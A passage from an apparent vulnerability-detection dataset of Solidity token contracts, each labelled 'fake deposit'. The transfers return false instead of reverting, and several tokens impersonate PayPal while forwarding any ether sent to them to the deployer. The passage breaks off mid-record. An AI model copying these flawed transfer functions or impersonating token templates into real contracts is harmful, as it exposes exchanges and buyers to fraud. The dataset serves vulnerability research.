        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract ShibaHotDog is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Shiba Hot Dog\";\r\n    string public constant symbol = \"INU \ud83c\udf2d\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// PayPal Official Token\r\n// https://paypal.com\r\n// https://twitter.com/PayPal\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract PayPal is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"PayPal\";\r\n    string public constant symbol = \"PAYPAL\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: Unlicense\r\n\r\n// ----------------------------------------------------------------------------\r\n// 'GrilledCheeseToken' token contract\r\n//\r\n// Symbol      : GCT \ud83e\udd6a\r\n// Name        : Grilled Cheese Token\r\n// Total supply: 100,000,000,000,000\r\n// Decimals    : 18\r\n// Burned      : 50%\r\n// ----------------------------------------------------------------------------\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract GrilledCheeseToken is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 100000000000000*10**uint256(decimals);\r\n    string public constant name = \"Grilled Cheese Token\";\r\n    string public constant symbol = \"GCT \ud83e\udd6a\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: GPL-3.0\r\n\r\npragma solidity ^0.8.0;\r\n\r\nabstract contract Token {\r\n\r\n    /// @return supply - total amount of tokens\r\n    function totalSupply() external virtual returns (uint256 supply);\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return balance - The balance\r\n    function balanceOf(address _owner) virtual public returns (uint256 balance);\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return success - Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) virtual public returns (bool success);\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return success - Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) virtual public returns (bool success);\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return success - Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) virtual public returns (bool success);\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return remaining - Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) virtual public returns (uint256 remaining);\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n\r\nabstract contract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) override public returns (bool success) {\r\n        require(paused == false, \"Contract Paused\");\r\n        \r\n        // Assumes totalSupply can't be over max (2^256 - 1).\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) override public returns (bool success) {\r\n        require(paused == false, \"Contract Paused\");\r\n        \r\n        // Assumes totalSupply can't be over max (2^256 - 1).\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) override public view returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) override public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) override public view returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    function setPaused(bool _paused) public {\r\n        require(msg.sender == owner, \"You are not the owner\");\r\n        paused = _paused;\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public override totalSupply;\r\n    bool public paused;\r\n    address public owner;\r\n}\r\n\r\n\r\ncontract SMILECoin is StandardToken {\r\n    \r\n    /* Public variables of the token */\r\n    mapping (address => uint256) public amount;\r\n    string public name;\r\n    string public symbol;\r\n    uint256 public decimals;\r\n    string public version;\r\n\r\n    // if ETH is sent to this address, send it back.\r\n    fallback() external payable { revert(); }\r\n    receive() external payable { revert(); }\r\n    \r\n    constructor () {\r\n        // Tokennomics\r\n        name = \"Smile Coin\";\r\n        decimals = 10;\r\n        symbol = \"SMILE\";\r\n        version = \"1.0\";\r\n        \r\n        owner = msg.sender;\r\n        setPaused(false);\r\n        \r\n        // Mint 10,000,000,000 Tokens and assign them to the Smile Reserve Wallet\r\n        totalSupply = 10000000000 * (10 ** uint256(decimals));\r\n        balances[msg.sender] = totalSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Inu_Finance is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Inu Finance\";\r\n    string public constant symbol = \"INUFI\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: Unlicense\r\n\r\n// ----------------------------------------------------------------------------\r\n// 'BurgerandFries' token contract\r\n//\r\n// Symbol      : BF \ud83c\udf54\ud83c\udf5f\r\n// Name        : Burger and Fries\r\n// Total supply: 100000000000000\r\n// Decimals    : 18\r\n// Burned      : 50%\r\n// ----------------------------------------------------------------------------\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract BurgerandFries is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Burger and Fries\";\r\n    string public constant symbol = \"BF \ud83c\udf54\ud83c\udf5f\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract SkyMomoInu is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Sky Momo Inu\";\r\n    string public constant symbol = \"SMOMO\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: Unlicense\r\n\r\n// ----------------------------------------------------------------------------\r\n// 'FlokiBone' token contract\r\n//\r\n// Symbol      : FBONE \ud83c\udf56\r\n// Name        : Floki Bone\r\n// Total supply: 100,000,000,000,000\r\n// Decimals    : 18\r\n// Burned      : 50%\r\n// ----------------------------------------------------------------------------\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract FlokiBone is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 100000000000000*10**uint256(decimals);\r\n    string public constant name = \"Floki Bone\";\r\n    string public constant symbol = \"FBONE \ud83c\udf56\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract PayPal_Official_Token is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"PayPal\";\r\n    string public constant symbol = \"PAYPAL\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n *Submitted for verification at Etherscan.io on 2021-04-24\r\n*/\r\n\r\npragma solidity 0.4.19;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n}\r\n\r\ncontract RegularToken is Token {\r\n\r\n    function transfer(address _to, uint _value) returns (bool) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint _value) returns (bool) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint _value) returns (bool) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint) balances;\r\n    mapping (address => mapping (address => uint)) allowed;\r\n    uint public totalSupply;\r\n}\r\n\r\ncontract UnboundedRegularToken is RegularToken {\r\n\r\n    uint constant MAX_UINT = 2**256 - 1;\r\n\r\n    /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\r\n    /// @param _from Address to transfer from.\r\n    /// @param _to Address to transfer to.\r\n    /// @param _value Amount to transfer.\r\n    /// @return Success of transfer.\r\n    function transferFrom(address _from, address _to, uint _value)\r\n    public\r\n    returns (bool)\r\n    {\r\n        uint allowance = allowed[_from][msg.sender];\r\n        if (balances[_from] >= _value\r\n        && allowance >= _value\r\n            && balances[_to] + _value >= balances[_to]\r\n        ) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            if (allowance < MAX_UINT) {\r\n                allowed[_from][msg.sender] -= _value;\r\n            }\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n}\r\n\r\ncontract STSToken is UnboundedRegularToken {\r\n\r\n    uint public totalSupply = 33*10**25;\r\n    uint8 constant public decimals = 18;\r\n    string constant public name = \"STARFISH\";\r\n    string constant public symbol = \"STS\";\r\n\r\n    function STSToken() {\r\n        balances[msg.sender] = totalSupply;\r\n        Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.6;\r\n\r\ncontract SafeRune {\r\n    string public name = 'Safu Rune';\r\n    uint8 public decimals = 18;\r\n    string public symbol = 'SafuRune';\r\n    string public version = '1.0';\r\n    uint256 public totalSupply = 0;\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n    Erc20Rune erc20RuneContract = Erc20Rune(0x3155BA85D5F96b2d030a4966AF206230e46849cb);\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            emit 